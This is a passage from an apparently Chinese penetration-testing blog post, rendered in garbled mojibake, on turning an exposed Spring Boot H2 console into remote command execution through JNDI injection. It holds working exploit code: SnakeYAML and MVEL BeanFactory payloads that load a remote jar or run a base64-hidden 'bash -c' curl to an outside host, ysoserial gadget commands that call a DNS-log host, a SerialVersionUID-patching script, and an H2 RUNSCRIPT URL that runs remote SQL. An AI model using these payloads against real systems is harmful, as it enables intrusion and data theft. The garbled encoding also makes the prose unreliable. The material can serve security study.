ç”Ÿæˆçš„åºåˆ—åŒ–æ•°æ®ï¼Œæœ€å¥½åœ¨å¦å¤–ä¸€ä¸ªç¯å¢ƒé‡Œé¢ååºåˆ—åŒ–æµ‹è¯•ã€‚<br>postè¯·æ±‚æäº¤ä¸Šé¢ç”Ÿæˆçš„<code>1.ser</code>åˆ°<code>/yso</code>æ¥å£ï¼Œå¦‚æœç”Ÿæˆ<code>1.ser</code>é‡Œé¢çš„ç±»åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å­˜åœ¨ï¼Œåˆ™ä¼šæ”¶åˆ°dnslogè¯·æ±‚ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">ThreadContext</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">LoggerFactory</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">.</span></span><span class="token class-name">UpperLookup</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span><span class="token annotation punctuation">@ResponseBody</span><span class="token annotation punctuation">@RestController</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestClass</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/yso"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">URLDemo</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ServletInputStream</span> inputStream <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">TestClass</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/log"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestHeader</span><span class="token punctuation">(</span><span class="token string">"X-Api-Version"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> apiVersion<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ThreadContext</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"apiVersion"</span><span class="token punctuation">,</span> apiVersion<span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Received a request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">UpperLookup</span> upperLookup <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UpperLookup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>upperLookup<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"Hello, API Controller!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç‚å­—è¾ˆå¸ˆå‚…å·²ç»å†™å¥½äº†<a href="https://github.com/kezibei/Urldns">URLDNS</a>ï¼Œå¯ä»¥ç”Ÿæˆæ¢æµ‹éœ€è¦çš„åºåˆ—åŒ–æ•°æ®åŒ…ã€‚å½“å­˜åœ¨JNDIæ³¨å…¥çš„æ—¶å€™ï¼Œå¯åŠ¨LDAPæœåŠ¡:<code>java -jar Urldns.jar ldap all &lt;dnslog&gt;</code>ï¼Œç„¶åä½¿ç”¨PAYLOAD: <code>ldap://&lt;ip&gt;:1389/Hello233</code>ã€‚</p><h4 id="Snkeyml"><a href="#Snkeyml" class="headerlink" title="Snkeyml"></a>Snkeyml</h4><p>å€Ÿç”¨Ceye.ioæ¢æµ‹H2 Databaseçš„é¡µé¢ï¼Œå‘ç°å¯ä»¥åˆ©ç”¨çš„é“¾å¾ˆå¤šï¼Œæ¯”å¦‚<code>cc1, cb17ã€mvelã€snakeyaml</code>ç­‰ï¼Œå…¶ä¸­<code>cc1ã€cb17</code>è¿™äº›é“¾å±äºLDAPååºåˆ—åŒ–ï¼Œ<code>mvelã€snkeyaml</code>å±äºåŠ è½½æœ¬åœ°Classã€‚<br>æµ…è“å¸ˆå‚…åœ¨<a href="https://tttang.com/archive/1405/">æ¢ç´¢é«˜ç‰ˆæœ¬ JDK ä¸‹ JNDI æ¼æ´çš„åˆ©ç”¨æ–¹æ³•</a>é‡Œé¢è®²çš„å¾ˆè¯¦ç»†ï¼Œè¿™é‡Œé€‰æ‹©ä½¿ç”¨<code>snkeyml</code>æ”»å‡»ï¼Œä¸»è¦åˆ©ç”¨ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ResourceRef</span> <span class="token function">tomcat_snakeyaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.yaml.snakeyaml.Yaml"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> yaml <span class="token operator">=</span> <span class="token string">"!!javax.script.ScriptEngineManager [\n"</span> <span class="token operator">+</span>            <span class="token string">"  !!java.net.URLClassLoader [[\n"</span> <span class="token operator">+</span>            <span class="token string">"    !!java.net.URL [\"http://127.0.0.1:8888/exp.jar\"]\n"</span> <span class="token operator">+</span>            <span class="token string">"  ]]\n"</span> <span class="token operator">+</span>            <span class="token string">"]"</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=load"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> yaml<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ref<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨æœåŠ¡ç«¯ä½¿ç”¨RMIæ‰˜ç®¡ï¼Œç„¶åå¼€å¯<a href="https://github.com/artsploit/yaml-payload">yaml-payload.jar</a>ï¼Œå¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚</p><h4 id="Mvel"><a href="#Mvel" class="headerlink" title="Mvel"></a>Mvel</h4><p>åœ¨æ›´æ¢MVELæ‰§è¡Œçš„æ—¶å€™ï¼Œæœ¬åœ°æµ‹è¯•å¼¹è®¡ç®—å™¨æˆåŠŸï¼Œä½†æ˜¯æ¢æˆæ‰§è¡Œå‘½ä»¤å°±ä¼šå¤±è´¥ï¼Œä½¿ç”¨IDEAæœ¬åœ°è°ƒè¯•ä¹‹åå‘ç°æŠŠpushå»æ‰ï¼Œç„¶åå¯ä»¥æ‰§è¡Œå‘½ä»¤æˆåŠŸï¼Œå…·ä½“åŸå› éœ€è¦å†è·Ÿè¸ªä¸€éï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ReferenceWrapper</span> <span class="token function">tomcat_MVEL</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">NamingException</span> <span class="token punctuation">&#123;</span><span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.mvel2.sh.ShellSession"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>            <span class="token string">"Runtime.getRuntime().exec('bash -c &#123;echo,Y3VybCBiYWlkdS5jb20vYHdob2FtaWA=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="åˆ©ç”¨LDAPè¿”å›ååºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡"><a href="#åˆ©ç”¨LDAPè¿”å›ååºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡" class="headerlink" title="åˆ©ç”¨LDAPè¿”å›ååºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡"></a>åˆ©ç”¨LDAPè¿”å›ååºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡</h3><p>LDAP Serveré™¤äº†ä½¿ç”¨JNDI Referenceè¿›è¡Œåˆ©ç”¨ä¹‹å¤–ï¼Œè¿˜æ”¯æŒç›´æ¥è¿”å›ä¸€ä¸ªå¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®ã€‚å¦‚æœJavaå¯¹è±¡çš„<code>javaSerializedData</code>å±æ€§å€¼ä¸ä¸ºç©ºï¼Œåˆ™å®¢æˆ·ç«¯çš„<code>obj.decodeObject()</code>æ–¹æ³•å°±ä¼šå¯¹è¿™ä¸ªå­—æ®µçš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–ï¼Œæ”»å‡»è€…ä»ç„¶å¯ä»¥åˆ©ç”¨å—å®³è€…æœ¬åœ°CLASSPATHä¸­å­˜åœ¨æ¼æ´çš„ååºåˆ—åŒ–Gadgetè¾¾åˆ°ç»•è¿‡é™åˆ¶æ‰§è¡Œå‘½ä»¤çš„ç›®çš„ã€‚</p><p>ä½¿ç”¨CCé“¾å¯ä»¥æµ‹è¯•æˆåŠŸï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class="token string">'curl xbaax2.ceye.io'</span><span class="token operator">|</span>base64 <span class="token operator">|</span>pbcopyjava -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class="token string">'curl xbaax2.ceye.io'</span><span class="token operator">|</span>base64 <span class="token operator">|</span>pbcopy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä½†æ˜¯åœ¨ä½¿ç”¨CBé“¾çš„æ—¶å€™ï¼Œæ‰§è¡Œå‘½ä»¤å¤±è´¥:<br><img src="/2022/03/18/from-spring-boot-to-getshell/3.png"><br>å¯ä»¥ä»æŠ¥é”™åŸå› çœ‹å‡ºæ¥ï¼Œå› ä¸ºCommonsBeanutils1çš„ç‰ˆæœ¬ä¸åŒï¼Œä¸åŒç‰ˆæœ¬ä¸­BeanComparatorè¿™ä¸ªç±»çš„<a href="https://github.com/kezibei/Urldns/blob/ea7774f9f1e6b1d64000228e82ed33a2f5a252dd/src/main/en.java#L119">SerialVersionUIDä¸ä¸€æ ·</a>ï¼Œä¼šé€ æˆååºåˆ—åŒ–å¤±è´¥ã€‚1.7x-1.8xä¸º-3490850999041592962,1.9xä¸º-2044202215314119608ã€‚<br>æœ‰ä¸¤ç§è§£å†³æ–¹æ³•ï¼š</p><ul><li>æ›¿æ¢ysoserialçš„CommonsBeanutils1ï¼Œä½¿ç”¨<a href="http://wjlshare.com/archives/1575">é­”æ”¹ç‰ˆæœ¬çš„ysoserial</a></li><li>ç”Ÿæˆååºåˆ—åŒ–æ•°æ®ä¹‹åï¼Œ<a href="https://github.com/phith0n/zkar">ä¿®æ”¹SUID</a>ä¸ºå¯¹åº”ç‰ˆæœ¬çš„å€¼</li></ul><p>åˆšå¥½æ—©ä¸Šçœ‹åˆ°På¸ˆå‚…å‘çš„æ–‡ç« ï¼Œå°è¯•ä½¿ç”¨<a href="https://github.com/phith0n/zkar">zkar</a>ä¿®æ”¹ysoserialç”Ÿæˆçš„åºåˆ—åŒ–æ•°æ®åŒ…ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤æˆåŠŸã€‚</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"github.com/phith0n/zkar/serz"</span><span class="token string">"io/ioutil"</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>data<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"cb1.ser"</span><span class="token punctuation">)</span>serialization<span class="token punctuation">,</span> err <span class="token operator">:=</span> serz<span class="token punctuation">.</span><span class="token function">FromBytes</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span><span class="token string">"parse error"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>object <span class="token operator">:=</span> serialization<span class="token punctuation">.</span>Contents<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Object<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> field <span class="token operator">:=</span> <span class="token keyword">range</span> object<span class="token punctuation">.</span>ClassDatas<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>FieldDatas <span class="token punctuation">&#123;</span><span class="token keyword">if</span> field<span class="token punctuation">.</span>TypeCode <span class="token operator">==</span> <span class="token string">"L"</span> <span class="token punctuation">&#123;</span>classPonter <span class="token operator">:=</span> field<span class="token punctuation">.</span>Object<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>serz<span class="token punctuation">.</span>TCObject<span class="token punctuation">)</span><span class="token punctuation">.</span>ClassPointer<span class="token keyword">if</span> classPonter<span class="token punctuation">.</span>Flag <span class="token operator">==</span> serz<span class="token punctuation">.</span>JAVA_TC_CLASSDESC <span class="token operator">&amp;&amp;</span>classPonter<span class="token punctuation">.</span>NormalClassDesc<span class="token punctuation">.</span>ClassName<span class="token punctuation">.</span>Data <span class="token operator">==</span> <span class="token string">"org.apache.commons.beanutils.BeanComparator"</span> <span class="token punctuation">&#123;</span>classPonter<span class="token punctuation">.</span>NormalClassDesc<span class="token punctuation">.</span>SerialVersionUID <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">3490850999041592962</span><span class="token keyword">break</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>ioutil<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span><span class="token string">"cb1-modify.ser"</span><span class="token punctuation">,</span> serialization<span class="token punctuation">.</span><span class="token function">ToBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0o755</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="H2-RCE"><a href="#H2-RCE" class="headerlink" title="H2 RCE"></a>H2 RCE</h3><p>å‚è€ƒsu18å¸ˆå‚…çš„<a href="https://su18.org/post/jdbc-connection-url-attack/#h2-rce">h2-rce</a>ï¼š</p><pre class="line-numbers language-none"><code class="language-none">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;poc.sql&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿œç¨‹æœåŠ¡å™¨çš„æ¶æ„SQL:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> ALIAS <span class="token keyword">EXEC</span> <span class="token keyword">AS</span> <span class="token string">'String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd);return "su18";&#125;'</span><span class="token punctuation">;</span><span class="token keyword">CALL</span> <span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token string">'open -a Calculator.app'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Spring &lt; 2.3.0çš„æ—¶å€™ï¼Œä¼šé»˜è®¤åˆ›å»º<code>jdbc:h2:mem:testdb</code>ï¼ŒSpring &gt;= 2.3.0çš„æ—¶å€™ï¼ŒSpringä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªUUIDéšæœºæ•°æ®åº“åï¼Œæ•°æ®åº“åå¯ä»¥åœ¨Spirngçš„æ—¥å¿—é‡Œçœ‹åˆ°ã€‚</p><h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><ul><li>RMIæ‰˜ç®¡åœ¨VPSçš„æ—¶å€™ï¼Œä¿®æ”¹<a href="https://github.com/JKme/EvilRMI/blob/main/src/main/java/com/rmi/RmiServer.java#L180">java.rmi.server.hostname</a>ä¸ºè‡ªå·±æœåŠ¡å™¨çš„IPåœ°å€</li><li>åœ¨å®Œå…¨é»‘ç›’çš„æƒ…å†µä¸‹ï¼Œæ³¨æ„SerialVersionUIDä¸åŒ¹é…çš„é—®é¢˜ï¼Œå…·ä½“è§<a href="https://github.com/kezibei/Urldns/blob/ea7774f9f1e6b1d64000228e82ed33a2f5a252dd/src/main/en.java">URLDNS</a></li></ul><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://81.68.118.217/index.php/archives/62/">JNDIæ³¨å…¥é«˜ç‰ˆæœ¬ç»•è¿‡</a></li><li><a href="https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw">Urldnsé“¾æ¢æµ‹ç±»å·¥å…·å‘æ”¾</a></li><li><a href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">æ„é€ javaæ¢æµ‹classååºåˆ—åŒ–gadget</a></li><li><a href="https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA">è€é“¾æ–°ç”¨ï¼Œåˆ©ç”¨URLDNSé“¾æ¢æµ‹gadget</a></li><li><a href="http://wjlshare.com/archives/1575">ysoserial å·¥å…·æ”¹é€ </a></li><li><a href="https://github.com/phith0n/zkar">zkar</a></li><li><a href="https://tttang.com/archive/1405/">æ¢ç´¢é«˜ç‰ˆæœ¬ JDK ä¸‹ JNDI æ¼æ´çš„åˆ©ç”¨æ–¹æ³•</a></li><li><a href="https://su18.org/post/jdbc-connection-url-attack">jdbc-connection-url-attack</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x1-åˆ‡å…¥ç‚¹&quot;&gt;&lt;a href=&quot;#0x1-åˆ‡å…¥ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;0x1. åˆ‡å…¥ç‚¹&quot;&gt;&lt;/a&gt;0x1. åˆ‡å…¥ç‚¹&lt;/h2&gt;&lt;p&gt;åœ¨æ—¥å¸¸æµ‹è¯•çš„æ—¶å€™ï¼Œä½¿ç”¨ffufå‘ç°ä¸€ä¸ª&lt;code&gt;/console&lt;/code&gt;çš„æ¥å£ï¼Œæ‰“å¼€ä¹‹åå‘ç°æ˜¯H2 Databaseé¡µé¢ï¼š&lt;br&gt;&lt;img src=&quot;/2022/03/18/from-spring-boot-to-getshell/1.png&quot;&gt;&lt;br&gt;å¦‚æœSpring Booté¡¹ç›®ä¸­åŒ…å«h2databaseå¹¶ä¸”åœ¨é…ç½®æ–‡ä»¶ä¸­å¯ç”¨h2-consoleï¼Œåˆ™å­˜åœ¨&lt;a href=&quot;https://anquan.baidu.com/article/1078&quot;&gt;JNDIæ³¨å…¥æ¼æ´&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;è®¾ç½®&lt;code&gt;Driver Class&lt;/code&gt;ä¸º&lt;code&gt;javax.naming.InitialContext&lt;/code&gt;ï¼Œ&lt;code&gt;JDBC URL&lt;/code&gt;ä¸º&lt;code&gt;ldap://attacker.com/Exploit&lt;/code&gt;ï¼š&lt;br&gt;&lt;img src=&quot;/2022/03/18/from-spring-boot-to-getshell/2.png&quot;&gt;&lt;br&gt;æ ¹æ®&lt;code&gt;/env&lt;/code&gt;æ³„æ¼çš„ä¿¡æ¯ï¼Œå¾—çŸ¥Javaç‰ˆæœ¬æ˜¯1.8.0_312ï¼Œé«˜ç‰ˆæœ¬JDKä¸­ç”±äºé»˜è®¤codebaseä¸ºtrueä»è€Œå¯¼è‡´å®¢æˆ·ç«¯é»˜è®¤ä¸ä¼šè¯·æ±‚è¿œç¨‹Serverä¸Šçš„æ¶æ„ Class, å› æ­¤ä¸å¯ä»¥ç›´æ¥ä½¿ç”¨LDAPåŠ è½½è¿œç¨‹æ¶æ„ä»£ç ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;RMIï¼šJDK 8u113ã€JDK 7u122ã€JDK 6u132 èµ· codebase é»˜è®¤ä¸º true&lt;br&gt;LDAPï¼šJDK 11.0.1ã€JDK 8u191ã€JDK 7u201ã€JDK 6u211 èµ· codebase é»˜è®¤ä¸º true&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x2-ç»•è¿‡å’Œåˆ©ç”¨&quot;&gt;&lt;a href=&quot;#0x2-ç»•è¿‡å’Œåˆ©ç”¨&quot; class=&quot;headerlink&quot; title=&quot;0x2. ç»•è¿‡å’Œåˆ©ç”¨&quot;&gt;&lt;/a&gt;0x2. ç»•è¿‡å’Œåˆ©ç”¨&lt;/h2&gt;&lt;h3 id=&quot;åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference-Factoryç»•è¿‡&quot;&gt;&lt;a href=&quot;#åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference-Factoryç»•è¿‡&quot; class=&quot;headerlink&quot; title=&quot;åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factoryç»•è¿‡&quot;&gt;&lt;/a&gt;åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factoryç»•è¿‡&lt;/h3&gt;&lt;p&gt;åˆ©ç”¨URLDNSé“¾å¯ä»¥æ¢æµ‹Javaé»‘ç›’åº”ç”¨é‡Œé¢æŸä¸ªç±»æ˜¯å¦å­˜åœ¨, åœ¨ç‚å­—è¾ˆå’Œc0ny1å¸ˆå‚…çš„ä¸¤ç¯‡æ–‡ç« è®²çš„å¾ˆè¯¦ç»†ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw&quot;&gt;Urldnsé“¾æ¢æµ‹ç±»å·¥å…·å‘æ”¾&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA&quot;&gt;æ„é€ javaæ¢æµ‹classååºåˆ—åŒ–gadget&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA&quot;&gt;è€é“¾æ–°ç”¨ï¼Œåˆ©ç”¨URLDNSé“¾æ¢æµ‹gadget&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;URLDNSçš„æµ‹è¯•ä»£ç ï¼Œç”Ÿæˆä¸€ä¸ªåºåˆ—åŒ–çš„æ•°æ®åŒ…&lt;code&gt;1.ser&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
